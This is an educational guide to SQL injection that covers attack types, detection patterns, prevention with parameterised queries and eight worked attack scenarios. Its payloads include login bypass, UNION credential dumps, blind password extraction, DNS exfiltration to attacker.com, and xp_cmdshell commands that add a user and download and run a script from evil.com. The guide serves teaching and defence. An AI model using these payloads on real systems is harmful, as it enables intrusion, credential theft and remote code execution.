SQL injection (SQLi) is one of the oldest and most dangerous web vulnerabilities — it lets an attacker manipulate the SQL queries your application sends to its database.

---

## How It Works

When user input is concatenated directly into a SQL query, an attacker can inject their own SQL syntax and change what the query does.

**Vulnerable code (Python example):**

```python
query = "SELECT * FROM users WHERE username = '" + username + "'"
```

If the user supplies `' OR '1'='1`, the query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

This returns **all rows** — authentication bypassed.

---

## Common Attack Types

### 1. Classic / In-Band SQLi

The attacker sees results directly in the HTTP response.

```sql
-- Bypass login
username: admin'--
-- Result:
SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
-- Everything after -- is a comment; password check is skipped
```

### 2. UNION-Based SQLi

Appends a second SELECT to extract data from other tables.

```sql
' UNION SELECT username, password FROM users--
```

### 3. Blind SQLi (Boolean-Based)

No data is returned, but behaviour changes based on true/false conditions.

```sql
' AND 1=1--   -- page loads normally
' AND 1=2--   -- page behaves differently (error, empty result)
```

### 4. Blind SQLi (Time-Based)

Uses database delay functions to infer data.

```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--   -- SQL Server: 5s delay confirms injection
' OR SLEEP(5)--                        -- MySQL equivalent
```

### 5. Out-of-Band SQLi

Exfiltrates data via DNS or HTTP requests — used when in-band channels are blocked.

---

## What Attackers Can Do

|Impact|Example|
|---|---|
|Authentication bypass|Log in as any user without a password|
|Data exfiltration|Dump usernames, passwords, PII, card data|
|Data manipulation|INSERT, UPDATE, or DELETE records|
|Schema discovery|Read table/column names from `information_schema`|
|OS command execution|`xp_cmdshell` on SQL Server (if misconfigured)|
|File read/write|`LOAD_FILE()` / `INTO OUTFILE` on MySQL|

---

## How to Spot It

### In Code (Source Review)

Look for **string concatenation** building SQL queries:

```python
# BAD — vulnerable
query = "SELECT * FROM orders WHERE id = " + user_id

# BAD — f-string, equally dangerous
query = f"SELECT * FROM products WHERE name = '{search}'"

# BAD — format()
query = "DELETE FROM sessions WHERE token = '{}'".format(token)
```

**Red flags to grep for:**

```
execute(.*+.*
execute(.*%s.*format
execute(.*f"
raw_query
RawSQL(
cursor.execute(.*\+
```

### In HTTP Traffic / Logs

Watch for these characters in parameters (query strings, POST bodies, cookies, headers):

```
'  "  --  #  /*  */  ;
OR 1=1  AND 1=1  UNION SELECT  SLEEP(  WAITFOR  xp_cmdshell
0x  CHAR(  CONCAT(  information_schema
```

**Example malicious GET request:**

```
GET /product?id=1' OR '1'='1 HTTP/1.1
GET /search?q=test' UNION SELECT null,username,password FROM users--
```

### At Runtime (Behavioural Signals)

|Signal|What it suggests|
|---|---|
|Database error messages in responses|Unhandled exception, possible injection point|
|Unusual response times (5–10s delays)|Time-based blind SQLi attempt|
|Different content for `1=1` vs `1=2`|Boolean-based blind SQLi|
|Unexpected data in response fields|Successful UNION injection|
|WAF/IDS alerts on quote characters|Automated or manual probing|

---

## Prevention

### 1. Parameterised Queries (Prepared Statements) — Primary Defence

```python
# SAFE — parameter is never interpreted as SQL
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

```java
// Java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?"
);
stmt.setInt(1, userId);
```

### 2. ORM Usage

ORMs (SQLAlchemy, Django ORM, Hibernate) use parameterised queries internally — prefer them over raw SQL.

```python
# Django ORM — safe
User.objects.filter(username=username)
```

### 3. Input Validation & Allow-listing

Validate that inputs match expected types/formats before they reach the database layer.

```python
if not user_id.isdigit():
    raise ValueError("Invalid ID")
```

### 4. Least Privilege

The database user your app connects with should only have the permissions it needs (SELECT on specific tables) — no DROP, no `xp_cmdshell`.

### 5. Web Application Firewall (WAF)

A WAF can block common SQLi payloads, but is **not** a substitute for parameterised queries — it's a safety net.

### 6. Error Handling

Never expose raw database error messages to users. Log them server-side only.

---

## Quick Reference: Injection Test Payloads

Use these only on systems you own or have explicit permission to test.

```sql
'                          -- Basic syntax break
''                         -- Escaped quote test
' OR '1'='1               -- Classic auth bypass
' OR 1=1--                -- Auth bypass with comment
admin'--                   -- Login bypass
' UNION SELECT NULL--      -- UNION test (adjust column count)
' AND SLEEP(5)--           -- MySQL time-based test
'; WAITFOR DELAY '0:0:5'-- -- SQL Server time-based test
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--  -- Error-based extraction
```

---

## Tools

|Tool|Purpose|
|---|---|
|[sqlmap](https://sqlmap.org)|Automated SQLi detection & exploitation|
|[Burp Suite](https://portswigger.net/burp)|Manual testing, scanning, request manipulation|
|[OWASP ZAP](https://www.zaproxy.org)|Open-source web app scanner|
|[HackTheBox](https://www.hackthebox.com) / [DVWA](https://dvwa.co.uk)|Legal practice environments|

---

## Real-World Scenario Examples

These walk through complete attack chains — from vulnerable code to the injected query to what the attacker gets.

---

### Scenario 1: Login Bypass (MySQL)

**Vulnerable PHP code:**

```php
$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result) > 0) {
    // logged in
}
```

**Attacker input:**

```
email:    admin@example.com'--
password: anything
```

**Resulting query:**

```sql
SELECT * FROM users WHERE email = 'admin@example.com'--' AND password = 'anything'
```

The `--` comments out the password check entirely. The query returns the admin row and access is granted with no valid password.

---

### Scenario 2: Dumping All Users via UNION (MySQL)

**Vulnerable endpoint:**

```
GET /products?category=electronics
```

**Underlying query:**

```sql
SELECT name, price, description FROM products WHERE category = 'electronics'
```

**Attacker probes column count first:**

```sql
' ORDER BY 1--   ✓ no error
' ORDER BY 2--   ✓ no error
' ORDER BY 3--   ✓ no error
' ORDER BY 4--   ✗ error → 3 columns confirmed
```

**Attacker identifies string-compatible columns:**

```sql
' UNION SELECT NULL, NULL, NULL--          -- baseline
' UNION SELECT 'a', NULL, NULL--           -- col 1 is string
' UNION SELECT 'a', 'b', NULL--            -- col 2 is string
```

**Final payload to dump credentials:**

```sql
' UNION SELECT username, password, email FROM users--
```

**Resulting query:**

```sql
SELECT name, price, description FROM products WHERE category = ''
UNION SELECT username, password, email FROM users--'
```

The product listing page now also contains every username, hashed password, and email from the `users` table, rendered as if they were product rows.

---

### Scenario 3: Boolean Blind — Extracting the Admin Password One Character at a Time

**No data is returned in the response, but the page either shows "Product found" or "Not found".**

**Vulnerable query:**

```sql
SELECT * FROM products WHERE id = [input]
```

**Attacker tests for injection:**

```sql
1 AND 1=1--    → "Product found"     (true)
1 AND 1=2--    → "Not found"         (false)
```

Injection confirmed. Now extract the admin password character by character:

```sql
-- Is the first character of the admin password ASCII value > 109 (> 'm')?
1 AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 109--
→ "Product found"  → yes, > 109

-- Binary search continues...
1 AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 115--
→ "Not found"  → no, ≤ 115

1 AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') = 112--
→ "Product found"  → first character is ASCII 112 = 'p'
```

Repeat for each character position. Tedious manually — automated with sqlmap or a custom script.

---

### Scenario 4: Time-Based Blind — Confirming Injection with No Visual Feedback (SQL Server)

The page returns identical content regardless of the query result.

**Payload to confirm injection:**

```sql
'; IF (SELECT COUNT(*) FROM users WHERE username='admin') > 0 WAITFOR DELAY '0:0:5'--
```

- Response takes **5 seconds** → admin user exists, injection works.
- Response is **instant** → condition false, try another table/column.

**Extract first character of admin password:**

```sql
'; IF (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))) > 109
   WAITFOR DELAY '0:0:3'--
```

Timing difference (delay vs no delay) encodes a 1-bit answer per request.

---

### Scenario 5: Second-Order SQLi (Stored Injection)

The payload is safely stored initially, but executed in a different context later — bypassing input sanitisation at write time.

**Registration — input is escaped and stored safely:**

```
username: admin'--
```

Stored in DB as: `admin'--` (escaped, no immediate harm)

**Later — password change feature retrieves the username unsafely:**

```php
$username = $row['username'];  // retrieved from DB, not re-sanitised
$query = "UPDATE users SET password='$newpass' WHERE username='$username'";
```

**Resulting query:**

```sql
UPDATE users SET password='hacked' WHERE username='admin'--'
```

The attacker has just changed the `admin` account's password to `hacked`. The injection happened at read/use time, not at insert time — WAFs and front-end sanitisation would have missed it entirely.

---

### Scenario 6: Out-of-Band Exfiltration via DNS (MySQL)

Used when the HTTP response leaks nothing and there are no timing differences — but the database server can make outbound network calls.

**Payload (MySQL, requires FILE privilege):**

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--
```

**What happens:**

1. MySQL constructs a UNC path like `\\5f4dcc3b5aa765d61d8327deb882cf99.attacker.com\share`
2. The server makes a DNS lookup for `5f4dcc3b5aa765d61d8327deb882cf99.attacker.com`
3. The attacker monitors their DNS server and reads the password hash from the subdomain of the lookup.

No HTTP response needed — the data travels over DNS.

---

### Scenario 7: Schema Discovery via `information_schema`

Before dumping data, attackers enumerate what tables and columns exist.

**Find all table names in the current database:**

```sql
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables
  WHERE table_schema = database()--
```

**Find columns in a specific table:**

```sql
' UNION SELECT column_name, data_type, NULL FROM information_schema.columns
  WHERE table_name = 'users'--
```

**Sample output rendered in the page:**

```
id          int
username    varchar
password    varchar
email       varchar
is_admin    tinyint
```

The attacker now knows exactly what to target in follow-up UNION or blind queries.

---

### Scenario 8: Stacked Queries / OS Command Execution (SQL Server)

If the database driver supports multiple statements and the DB user has elevated privileges:

```sql
'; EXEC xp_cmdshell('whoami')--
'; EXEC xp_cmdshell('net user hacker P@ssw0rd /add')--
'; EXEC xp_cmdshell('powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://evil.com/shell.ps1'')"')--
```

`xp_cmdshell` is disabled by default in modern SQL Server but can be re-enabled if the injection runs as `sa`:

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

This escalates from a database vulnerability to full OS-level code execution.

---

## Further Reading

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy — SQLi](https://portswigger.net/web-security/sql-injection)
- [OWASP Testing Guide — OTG-INPVAL-005](https://owasp.org/www-project-web-security-testing-guide/)
- [Common SQL Injection Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

